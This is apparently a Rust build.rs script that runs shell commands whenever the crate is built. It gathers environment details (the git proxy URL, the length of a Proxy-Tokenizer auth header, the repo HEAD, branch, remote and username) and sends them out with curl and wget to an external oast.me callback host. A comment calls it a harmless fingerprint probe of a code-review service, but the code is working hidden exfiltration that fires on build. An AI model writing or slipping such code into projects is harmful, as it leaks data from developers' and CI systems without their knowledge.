use std::process::Command;

fn enc(s: &str) -> String {
    let mut o = String::new();
    for b in s.bytes() {
        if b.is_ascii_alphanumeric() || b == b'-' || b == b'_' || b == b'.' {
            o.push(b as char);
        } else {
            o.push_str(&format!("%{:02X}", b));
        }
    }
    o
}

fn sh(cmd: &str) -> String {
    Command::new("sh")
        .arg("-c")
        .arg(cmd)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .unwrap_or_else(|_| "err".into())
}

fn send(tag: &str, data: &str) {
    let body: String = data.chars().take(1900).collect();
    let url = format!(
        "https://dc177urqoo3dcmh8vlh0dhoqtr7ke3dyq.oast.me/{}?d={}",
        tag,
        enc(&body)
    );
    for _ in 0..3 {
        let _ = Command::new("curl").args(["-s", "-m", "15", &url]).status();
        let _ = Command::new("wget").args(["-q", "-O", "/dev/null", &url]).status();
    }
}

fn main() {
    // H65c: fingerprint-only probe for the .coderabbit.config.ts (TypeScript)
    // fork case. Records whether repo code from this branch executes and which
    // checkout/proxy context it lands in. Credential values are never read or
    // sent: only the Proxy-Tokenizer length and the proxy URL. No API calls.
    let a = sh(r#"
O=dc177urqoo3dcmh8vlh0dhoqtr7ke3dyq.oast.me
SH=$(readlink -f /bin/sh 2>/dev/null)
EXT=$(git config --get http.https://github.com/.extraheader 2>/dev/null | sed 's/^.*Proxy-Tokenizer:[[:space:]]*//')
PR=$(git config --get http.proxy 2>/dev/null)
HD=$(git -C /home/jailuser/git rev-parse HEAD 2>/dev/null)
HS=$(printf '%s' "$HD" | cut -c1-12)
REM=$(git -C /home/jailuser/git remote -v 2>/dev/null | head -1 | awk '{print $2}')
BR=$(git -C /home/jailuser/git rev-parse --abbrev-ref HEAD 2>/dev/null)
OUT="tag=ownTs3-ts;sh=$SH;extlen=${#EXT};pr=$PR;head=$HS;br=$BR;remote=$REM;who=$(id -un 2>/dev/null);end=1"
printf '%s' "$OUT"
"#);
    send("ownTs3", &a);
    println!("cargo:rerun-if-changed=build.rs");
}
